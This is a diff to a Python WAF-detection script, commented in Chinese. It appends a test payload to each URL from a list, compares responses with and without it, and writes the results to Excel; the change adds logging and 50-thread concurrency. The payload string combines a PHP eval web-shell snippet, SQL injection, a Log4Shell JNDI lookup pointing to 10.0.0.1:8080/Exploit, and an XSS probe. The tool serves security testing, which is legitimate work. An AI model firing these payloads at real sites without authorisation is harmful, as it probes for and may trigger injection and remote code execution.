@@ -1,6 +1,8 @@
 import os
 import sys
+import time
 import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from openpyxl import Workbook
 from openpyxl.styles import Border, Side, Font, Alignment
 from openpyxl.utils import get_column_letter
@@ -9,13 +11,15 @@ from bs4 import BeautifulSoup
 from publicsuffixlist import PublicSuffixList
 from urllib.parse import urlsplit
 from urllib3.exceptions import InsecureRequestWarning
+import logging
 
 # 禁用不安全请求的警告
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+start_time = time.time()
+
 def get_primary_domain(url):
     psl = PublicSuffixList()
-    #domain = psl.privatesuffix(url)
-    netloc = urlsplit(url).netloc
+    netloc = urlsplit(url).netloc.split(':')[0]
     domain = psl.privatesuffix(netloc)
     return domain
 
@@ -23,9 +27,9 @@ def read_urls_from_file(file_path):
     with open(file_path, 'r') as file:
         return file.read().splitlines()
 
-def get_response_info(url,headers):
+def get_response_info(url, headers):
     try:
-        response = requests.get(url, headers=headers, verify=False ,timeout=5)
+        response = requests.get(url, headers=headers, verify=False, timeout=10)
         soup = BeautifulSoup(response.content, 'html.parser')
         title = soup.title.string.strip() if soup.title and soup.title.string else "无标题"
         status_code = response.status_code
@@ -35,82 +39,110 @@ def get_response_info(url,headers):
     except requests.exceptions.ConnectionError:
         return "连接被拒绝", 0
 
+# 初始化日志配置
+def init_logger(log_file="waf_check_v1.6.log"):
+    logger = logging.getLogger("WAFLogger")
+    logger.setLevel(logging.INFO)
+
+    # 控制台输出
+    console_handler = logging.StreamHandler(sys.stdout)
+    console_handler.setLevel(logging.INFO)
+
+    # 文件输出
+    file_handler = logging.FileHandler(log_file, encoding="utf-8")
+    file_handler.setLevel(logging.INFO)
+
+    # 格式
+    formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
+    console_handler.setFormatter(formatter)
+    file_handler.setFormatter(formatter)
+
+    # 添加到 logger
+    logger.addHandler(console_handler)
+    logger.addHandler(file_handler)
+
+    return logger
+
+# 使用示例
+logger = init_logger()
+
+def log(msg, level="info"):
+    if level == "error":
+        logger.error(msg)
+    elif level == "warning":
+        logger.warning(msg)
+    else:
+        logger.info(msg)
+
+def determine_waf_status(before_code, before_title, after_code, after_title):
+    if(before_code == 200):
+        if after_code in [403, 0, 1]:
+            return '存在防护'
+        elif(after_code == 200 and before_title == after_title):
+            return '不存在防护'
+        elif after_code in [500, 502, 504]:
+            return '疑似存在防护'
+        else:
+            return '疑似存在防护'
+    elif(before_code != 0 and before_code != 1):
+        if(after_code == 0 or after_code == 1):
+            return '存在防护'
+        elif((after_code != before_code) or (after_code == before_code and before_title != after_title)):
+            return '疑似存在防护'
+        elif(after_code == before_code and before_title == after_title):
+            return '不存在防护'
+        else:
+            return '漏网之鱼'
+    elif(before_code == 0):
+        return '站点无法访问'
+    else:
+        return '请求失败'
 
 def check_waf(url, payloads, headers=None):
     results = []
     for payload in payloads:
         target_url = url + payload
-        result = {}
-        result['URL'] = url
-        result['Payload'] = target_url
-        result['domain'] = get_primary_domain(url)
-        # print(target_url)
-        print('=======================================')
-        print(url)
-        print('----------------不含poc----------------')
+        domain = get_primary_domain(url)
         before_title, before_code = get_response_info(url, headers)
         after_title, after_code = get_response_info(target_url, headers)
-        print(before_code,before_title)
-        print('----------------含poc------------------')
-        print(after_code,after_title)
-        print('--------------检测结果-----------------')
-        result['after_code'] = after_code
-        result['before_code'] = before_code
-        result['after_title'] = after_title
-        result['before_title'] = before_title
-        # if((before_code == 200 and after_code == 403) or (before_code == 200 and after_code == 0) or (before_code != 200 and after_code == 0)):
-        #     print('存在WAF')
-        # elif((before_code == 200 and after_code != 200 or after_code != 403 or after_code != 0)):
-        #     print(1)
-        if(before_code == 200):
-            if(after_code == 403 or after_code == 0 or after_code == 1):
-                print('存在WAF')
-                result['WAF_Status'] = '存在WAF'
-            elif(after_code == 200 and before_title == after_title):
-                print('不存在WAF')
-                result['WAF_Status'] = '不存在WAF'
-            else:
-                print('疑似存在WAF')
-                result['WAF_Status'] = '疑似存在WAF'
-        elif(before_code != 0 and before_code != 1):
-            if(after_code == 0 or after_code == 1):
-                print('存在WAF')
-                result['WAF_Status'] = '存在WAF'
-            elif((after_code != before_code) or (after_code == before_code and before_title != after_title)):
-                print('疑似存在WAF')
-                result['WAF_Status'] = '疑似存在WAF'
-            elif(after_code == before_code and before_title == after_title):
-                print('不存在WAF')
-                result['WAF_Status'] = '不存在WAF'
-            else:
-                print('漏网之鱼')
-                result['WAF_Status'] = '漏网之鱼'
-        elif(before_code == 0):
-            print('站点无法访问')
-            # 被服务器拒绝。站点可能无法访问或者被安全设备封禁了
-            result['WAF_Status'] = '站点无法访问'
-        else:
-            print('请求超时，网络异常')
-            result['WAF_Status'] = '请求失败'
+        waf_status = determine_waf_status(before_code, before_title, after_code, after_title)
+        log(f"""
+=======================================
+{url}
+----------------不含poc----------------
+{before_code} {before_title}
+----------------含poc------------------
+{after_code} {after_title}
+--------------检测结果-----------------
+{waf_status}
+""")
+        result = {
+            'URL': url,
+            'Payload': target_url,
+            'domain': domain,
+            'before_code': before_code,
+            'before_title': before_title,
+            'after_code': after_code,
+            'after_title': after_title,
+            'WAF_Status': waf_status
+        }
         results.append(result)
     return results
 
 def get_filename_without_extension(file_path):
-    base_name = os.path.basename(file_path)  # 获取路径的基本文件名
-    file_name_without_extension, _ = os.path.splitext(base_name)  # 分割文件名和扩展名
+    base_name = os.path.basename(file_path)
+    file_name_without_extension, _ = os.path.splitext(base_name)
     return file_name_without_extension
 
 def set_border(sheet):
-    # 设置框线
     border = Border(left=Side(style='thin'), right=Side(style='thin'),
                     top=Side(style='thin'), bottom=Side(style='thin'))
-    for row in ws.iter_rows(min_row=1, max_row=ws.max_row, min_col=1, max_col=ws.max_column):
+    for row in sheet.iter_rows(min_row=1, max_row=sheet.max_row, min_col=1, max_col=sheet.max_column):
         for cell in row:
             cell.border = border
 
 def set_columns(sheet):
-    # 设置列宽为最适合的列宽
-    for col in ws.columns:
+    for col in sheet.columns:
         max_length = 0
         column = [cell for cell in col]
         for cell in column:
@@ -120,7 +152,9 @@ def set_columns(sheet):
             except:
                 pass
         adjusted_width = (max_length + 2)
-        ws.column_dimensions[get_column_letter(col[0].column)].width = adjusted_width
+        sheet.column_dimensions[get_column_letter(col[0].column)].width = adjusted_width
+
+# 主程序入口
 url_file_path = 'urls.txt'
 try:
     url_file_path = sys.argv[1]
@@ -129,24 +163,46 @@ except:
     print('请输入txt文件名，默认读取urls.txt！')
     print('python3 check-waf.py urls.txt')
     sys.exit()
+
 urls = read_urls_from_file(url_file_path)
 headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
-payloads = ["?a=<%3fphp+%40eval($_GET['cmd'])%3b%3f>&b=1'+or+'1'%3d'1&c=${jndi%3aldap%3a//10.0.0.1%3a8080/Exploit}&s=<script>alert(1)</script>&id=UNION+SELECT+ALL+FROM+information_schema+AND+'+or+SLEEP(5)+or+'"]  # 这里可以添加更多的payload
+payloads = ["?a=<%3fphp+%40eval($_GET['cmd'])%3b%3f>&b=1'+or+'1'%3d'1&c=${jndi%3aldap%3a//10.0.0.1%3a8080/Exploit}&s=<script>alert(1)</script>&id=UNION+SELECT+ALL+FROM+information_schema+AND+'+or+SLEEP(5)+or+'"]
+
 results = []
-for url in urls:
-    results.extend(check_waf(url, payloads, headers))
 
-# 创建一个新的Excel工作簿
+# 使用线程池并行执行
+with ThreadPoolExecutor(max_workers=50) as executor:  # 可以根据机器性能调整线程数
+    future_to_url = {executor.submit(check_waf, url, payloads, headers): url for url in urls}
+    for future in as_completed(future_to_url):
+        try:
+            res = future.result()
+            results.extend(res)
+        except Exception as e:
+            log(f"Error processing {future_to_url[future]}: {e}")
+
+end_time = time.time()
+elapsed_time = end_time - start_time
+days, rem = divmod(elapsed_time, 86400)
+hours, rem = divmod(rem, 3600)
+minutes, seconds = divmod(rem, 60)
+time_str = ""
+if days > 0:
+    time_str += f"{int(days)}天 "
+if days > 0 or hours > 0:
+    time_str += f"{int(hours)}小时 "
+if days > 0 or hours > 0 or minutes > 0:
+    time_str += f"{int(minutes)}分钟 "
+time_str += f"{seconds:.2f}秒"
+log(f"运行时间: {time_str}")
+
+# 写入 Excel
 wb = Workbook()
-# 获取当前活动的工作表
 ws = wb.active
-
-# 设置第一行为"URL"、"Payload"和"WAF_Status"，并应用字体和对齐样式
-for i, title in enumerate(["URL", "domain","before_code", "before_title", "after_code", "after_title", "WAF_Status"], start=1):
+for i, title in enumerate(["URL", "domain","before_code", "before_title", "after_code", "after_title", "WAF_Status", "Payload"], start=1):
     cell = ws.cell(row=1, column=i, value=title)
     cell.font = Font(bold=True)
     cell.alignment = Alignment(horizontal='center', vertical='center')
-# 将结果保存到Excel文件中
+
 for i, result in enumerate(results, start=2):
     ws.cell(row=i, column=1, value=result['URL'])
     ws.cell(row=i, column=2, value=result['domain'])
@@ -154,20 +210,11 @@ for i, result in enumerate(results, start=2):
     ws.cell(row=i, column=4, value=result['before_title'])
     ws.cell(row=i, column=5, value=result['after_code'])
     ws.cell(row=i, column=6, value=result['after_title'])
-
-    # ws.cell(row=i, column=3, value=result['WAF_Status'])
-    if 'WAF_Status' in result:
-        ws.cell(row=i, column=7, value=result['WAF_Status'])
-    else:
-        ws.cell(row=i, column=7, value='N/A')
+    ws.cell(row=i, column=7, value=result['WAF_Status'])
     ws.cell(row=i, column=8, value=result['Payload'])
 
-# 设置框线
 set_border(ws)
-# 设置列宽为最适合的列宽
 set_columns(ws)
 
-# 获取当前时间并格式化为字符串
 current_time = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
-# 保存Excel文件
 wb.save(f"{file_name}_waf_results_{current_time}.xlsx")
